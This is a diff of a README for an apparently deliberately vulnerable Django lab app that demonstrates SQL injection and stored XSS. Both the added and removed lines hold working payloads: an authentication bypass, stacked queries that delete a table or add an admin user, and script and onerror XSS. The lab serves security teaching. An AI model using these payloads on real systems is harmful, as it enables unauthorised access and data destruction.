@@ -122,7 +122,7 @@ source vulnerable_env/bin/activate  # macOS/Linux
 vulnerable_env\Scripts\activate     # Windows
 
 # Install dependencies
-pip install django
+pip install -r requirements.txt
 
 # Initialize vulnerable database
 python manage.py makemigrations mainapp
@@ -138,146 +138,65 @@ python manage.py runserver 8001
 
 ---
 
-## 💉 **SQL Injection Demonstrations**
 
 ### **🎯 Attack 1: Authentication Bypass**
 
-#### **Vulnerable Code Location:**
-```python
 # mainapp/views.py - login_view() function
-raw_query = f"""
-    SELECT username, password_hash, salt 
-    FROM mainapp_user 
-    WHERE username = '{username}'
-"""
-```
 
 #### **Attack Payload:**
+
 ```sql
 Username: admin' OR '1'='1' --
-Password: anything
-```
-
-#### **What Happens:**
-```sql
--- Original intended query:
-SELECT username, password_hash, salt FROM mainapp_user WHERE username = 'admin'
-
--- Malicious injected query:
-SELECT username, password_hash, salt FROM mainapp_user WHERE username = 'admin' OR '1'='1' --'
-
--- Result: '1'='1' is always true, returns all users, bypasses authentication
+Password: Anything123!
 ```
 
 ---
 
 ### **🎯 Attack 2: Database Destruction**
 
-#### **Vulnerable Code Location:**
-```python
 # mainapp/views.py - register() function
-cursor.executescript(f"""
-    INSERT INTO mainapp_user (username, email, password_hash, salt)
-    VALUES ('{username}', '{email}', '{password_hash}', '{salt_hex}');
-""")
-```
 
 #### **Attack Payload:**
+
 ```sql
-Username: test-sqli','','','');DELETE FROM mainapp_customer;--
+Username: sqli-test','','','');DELETE FROM mainapp_customer;--
 Email: test@test.com
-Password: anything123
-```
-
-#### **What Happens:**
-```sql
--- Intended query:
-INSERT INTO mainapp_user (...) VALUES ('test', 'test@test.com', 'hash', 'salt');
-
--- Malicious query:
-INSERT INTO mainapp_user (...) VALUES ('test-sqli','','','');DELETE FROM mainapp_customer;--', 'test@test.com', 'hash', 'salt');
-
--- Result: User created, then entire user table deleted!
+Password: Anything123!
 ```
 
 ---
 
 ### **🎯 Attack 3: Data Manipulation**
 
-#### **Vulnerable Code Location:**
-```python
 # mainapp/views.py - add_customer() function
-query = f"""
-    INSERT INTO mainapp_customer (first_name, last_name, id_number, created_by)
-    VALUES ('{first_name}', '{last_name}', '{id_number}','{username}');
-"""
-```
 
 #### **Attack Payload:**
+
 ```sql
-First Name: John'); INSERT INTO mainapp_user VALUES ('hacker', 'hacker@evil.com', 'adminpass', 'salt'); --
-Last Name: Doe
-ID: 123456789
+First Name: TEST
+Last Name: TEST
+ID: 123','');DELETE FROM mainapp_customer;--
 ```
-
-#### **What Happens:**
-```sql
--- Intended query:
-INSERT INTO mainapp_customer (...) VALUES ('John', 'Doe', '123456789', 'user');
-
--- Malicious query:
-INSERT INTO mainapp_customer (...) VALUES ('John'); INSERT INTO mainapp_user VALUES ('hacker', 'hacker@evil.com', 'adminpass', 'salt'); --', 'Doe', '123456789', 'user');
-
--- Result: Customer added AND new admin user created!
-```
-
 ---
 
 ## 🚨 **XSS Attack Demonstrations**
 
-### **🎯 Stored XSS Attack 1: Customer List**
+### **🎯 Stored XSS Attack: Customer List**
 
-#### **Vulnerable Code Location:**
-```html
-<!-- mainapp/templates/mainapp/customer_list.html -->
-<td>{{ customer.first_name|safe }} {{ customer.last_name|safe }}</td>
-<td>{{ customer.id_number|safe }}</td>
-```
-
-**⚠️ The `|safe` filter disables Django's XSS protection!**
+# mainapp/views.py - add_customer() function
 
 #### **Attack Payload:**
+
 ```html
-First Name: <script> alert("XSS") </script>
-Last Name: Victim
-ID: 999999999
+First Name: TESTXSS
+Last Name: TESTXSS
+ID: <script> alert("XSS") </script>
 ```
 
 #### **What Happens:**
 1. Malicious script stored in database
 2. Every user viewing customer list executes the script
 3. **Persistent attack** affects all users
-
----
-
-### **🎯 Stored XSS Attack 2: System Dashboard**
-
-#### **Vulnerable Code Location:**
-```html
-<!-- mainapp/templates/mainapp/system.html -->
-{% if new_customer %}
-    ✅ New customer added: {{ new_customer.first_name|safe }} {{ new_customer.last_name|safe }}
-{% endif %}
-```
-
-#### **Attack Payload:**
-```html
-First Name: <img src="x" onerror="alert('Dashboard Hacked!');">
-```
-
-#### **What Happens:**
-1. Script executes immediately on dashboard after customer creation
-2. **Immediate impact** on the user who created the customer
 
 ---
 
